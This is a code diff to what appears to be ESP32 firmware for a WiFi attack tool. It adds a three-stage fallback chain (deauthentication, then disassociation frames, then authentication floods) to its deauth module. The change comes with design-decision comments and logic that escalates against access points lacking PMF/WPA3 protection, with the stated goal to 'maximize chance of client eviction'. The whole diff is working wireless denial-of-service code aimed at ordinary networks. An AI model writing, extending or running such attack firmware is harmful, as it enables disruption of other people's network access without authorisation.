@@ -13,6 +13,20 @@
 #include "wifi_tx_fix.h"
 
 static const char *TAG = "deauth";
+// ============================================================================
+//  DEAUTH FALLBACK CHAIN DECISION
+// ============================================================================
+//  Branch A — Fixed 3-stage chain: deauth → disassoc → auth_flood
+//    Decision: ACCEPTED. Deterministic progression; each stage has a
+//    distinct failure mode and frame type.
+//  Branch B — Random fallback with probability weighting
+//    Decision: REJECTED. Unpredictable behavior; deterministic chain is
+//    easier to reason about and debug in field conditions.
+//  Branch C — Skip disassoc, go straight to auth_flood
+//    Decision: REJECTED. Disassoc is lighter-weight and may succeed where
+//    deauth is filtered; skipping it wastes a useful intermediate step.
+
+
 
 static const uint8_t DEAUTH_TEMPLATE[] = {
     0xC0, 0x00,
@@ -25,8 +39,12 @@ static const uint8_t DEAUTH_TEMPLATE[] = {
 };
 
 #define DEAUTH_FRAME_SIZE sizeof(DEAUTH_TEMPLATE)
+#define DISASSOC_FRAME_SIZE 26
+#define AUTH_FRAME_SIZE 30
 #define DEAUTH_CH_SCAN_MS 250
 #define DEAUTH_CH_SCAN_SLOTS 13
+#define DEAUTH_FALLBACK_DISASSOC_LIMIT 40
+#define DEAUTH_FALLBACK_AUTH_LIMIT 80
 
 deauth_target_t g_deauth_targets[MAX_TARGET_APS];
 int g_deauth_target_count = 0;
@@ -39,6 +57,35 @@ static bool deauth_target_is_protected(const uint8_t *bssid)
     bool pmf_req = false, wpa3 = false;
     if (!wifi_sniffer_get_security(bssid, &pmf_req, &wpa3)) return false;
     return pmf_req && wpa3;
+}
+
+static void deauth_send_disassoc(const uint8_t *dst, const uint8_t *bssid)
+{
+    if (dst == NULL || bssid == NULL) return;
+
+    uint8_t frame[DISASSOC_FRAME_SIZE];
+    memcpy(frame, DISASSOC_TEMPLATE, DISASSOC_FRAME_SIZE);
+    memcpy(&frame[4], dst, 6);
+    memcpy(&frame[10], bssid, 6);
+    memcpy(&frame[16], bssid, 6);
+
+    esp_err_t ret = wifi_tx_safe(WIFI_IF_AP, frame, DISASSOC_FRAME_SIZE);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "disassoc tx FAILED to " MACSTR ": %s", MAC2STR(dst), esp_err_to_name(ret));
+    }
+}
+
+static void deauth_send_auth_flood(const uint8_t *bssid)
+{
+    if (bssid == NULL) return;
+
+    uint8_t frame[AUTH_FRAME_SIZE];
+    uint16_t seq = (uint16_t)(g_deauth_seq & 0xFFFF);
+    for (int i = 0; i < 8; i++) {
+        build_auth_frame(frame, bssid, bssid, (uint16_t)(seq + i));
+        wifi_tx_safe(WIFI_IF_AP, frame, AUTH_FRAME_SIZE);
+    }
+    g_deauth_seq += 8;
 }
 
 static void deauth_send_frame(const uint8_t *dst, const uint8_t *src, const uint8_t *bssid)
@@ -68,6 +115,46 @@ static void deauth_send_frame(const uint8_t *dst, const uint8_t *src, const uint
                  dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
                  esp_err_to_name(ret));
     }
+}
+
+const char *deauth_fallback_level_name(deauth_fallback_t level)
+{
+    switch (level) {
+        case DEAUTH_FALLBACK_NONE:        return "none";
+        case DEAUTH_FALLBACK_DISASSOC:    return "disassoc";
+        case DEAUTH_FALLBACK_AUTH_FLOOD:  return "auth_flood";
+        default:                          return "unknown";
+    }
+}
+
+bool deauth_has_escalated(const uint8_t *bssid)
+{
+    if (bssid == NULL || g_deauth_lock == NULL) return false;
+
+    xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
+    for (int i = 0; i < g_deauth_target_count; i++) {
+        if (memcmp(g_deauth_targets[i].bssid, bssid, 6) == 0) {
+            bool escalated = (g_deauth_targets[i].fallback_level != DEAUTH_FALLBACK_NONE);
+            xSemaphoreGive(g_deauth_lock);
+            return escalated;
+        }
+    }
+    xSemaphoreGive(g_deauth_lock);
+    return false;
+}
+
+static deauth_fallback_t deauth_get_fallback(const deauth_target_t *t)
+{
+    if (t == NULL) return DEAUTH_FALLBACK_NONE;
+
+    if (t->fallback_level == DEAUTH_FALLBACK_DISASSOC &&
+        t->disassoc_count >= DEAUTH_FALLBACK_DISASSOC_LIMIT) {
+        return DEAUTH_FALLBACK_AUTH_FLOOD;
+    }
+    if (t->fallback_level == DEAUTH_FALLBACK_AUTH_FLOOD) {
+        return DEAUTH_FALLBACK_AUTH_FLOOD;
+    }
+    return DEAUTH_FALLBACK_DISASSOC;
 }
 
 static void deauth_task(void *arg)
@@ -105,19 +192,67 @@ static void deauth_task(void *arg)
 
             bool unlimited = (g_deauth_targets[i].count == 0);
 
-            deauth_send_frame(
-                g_deauth_targets[i].client_mac,
-                g_deauth_targets[i].bssid,
-                g_deauth_targets[i].bssid
-            );
-            deauth_send_frame(
-                g_deauth_targets[i].bssid,
-                g_deauth_targets[i].client_mac,
-                g_deauth_targets[i].bssid
-            );
+            switch (g_deauth_targets[i].fallback_level) {
+                case DEAUTH_FALLBACK_DISASSOC:
+                case DEAUTH_FALLBACK_AUTH_FLOOD: {
+                    deauth_fallback_t fb = deauth_get_fallback(&g_deauth_targets[i]);
 
-            if (!unlimited) {
-                g_deauth_targets[i].count--;
+                    if (fb == DEAUTH_FALLBACK_DISASSOC) {
+                        uint8_t bcast[6];
+                        memset(bcast, 0xFF, 6);
+                        if (g_deauth_targets[i].client_mac[0] == 0xFF) {
+                            /* Broadcast target: disassoc to broadcast */
+                            deauth_send_disassoc(bcast,
+                                                 g_deauth_targets[i].bssid);
+                        } else {
+                            deauth_send_disassoc(g_deauth_targets[i].client_mac,
+                                                 g_deauth_targets[i].bssid);
+                            deauth_send_disassoc(g_deauth_targets[i].bssid,
+                                                 g_deauth_targets[i].client_mac);
+                        }
+                        g_deauth_targets[i].disassoc_count++;
+
+                        if (g_deauth_targets[i].disassoc_count >= DEAUTH_FALLBACK_DISASSOC_LIMIT) {
+                            g_deauth_targets[i].fallback_level = DEAUTH_FALLBACK_AUTH_FLOOD;
+                            ESP_LOGI(TAG, "target " MACSTR " escalating to auth flood",
+                                     MAC2STR(g_deauth_targets[i].bssid));
+                        }
+                    } else {
+                        deauth_send_auth_flood(g_deauth_targets[i].bssid);
+                        g_deauth_targets[i].auth_count++;
+                    }
+
+                    if (!unlimited) {
+                        g_deauth_targets[i].count--;
+                    }
+                    break;
+                }
+                default: {
+                    /* Primary deauth frames */
+                    deauth_send_frame(
+                        g_deauth_targets[i].client_mac,
+                        g_deauth_targets[i].bssid,
+                        g_deauth_targets[i].bssid
+                    );
+                    deauth_send_frame(
+                        g_deauth_targets[i].bssid,
+                        g_deauth_targets[i].client_mac,
+                        g_deauth_targets[i].bssid
+                    );
+
+                    if (!unlimited) {
+                        g_deauth_targets[i].count--;
+                    }
+
+                    /* If deauth target has no PMF guard and fallback enabled,
+                     * escalate to disassoc after first pass to maximize chance
+                     * of client eviction. */
+                    if (!deauth_target_is_protected(g_deauth_targets[i].bssid) &&
+                        g_deauth_targets[i].fallback_level == DEAUTH_FALLBACK_NONE) {
+                        g_deauth_targets[i].fallback_level = DEAUTH_FALLBACK_DISASSOC;
+                    }
+                    break;
+                }
             }
         }
 
@@ -183,6 +318,9 @@ esp_err_t deauth_add_target(const uint8_t *bssid, const uint8_t *client_mac, uin
     g_deauth_targets[idx].count = count;
     g_deauth_targets[idx].delay_ms = delay_ms;
     g_deauth_targets[idx].active = true;
+    g_deauth_targets[idx].fallback_level = DEAUTH_FALLBACK_NONE;
+    g_deauth_targets[idx].disassoc_count = 0;
+    g_deauth_targets[idx].auth_count = 0;
     g_deauth_target_count++;
 
     xSemaphoreGive(g_deauth_lock);
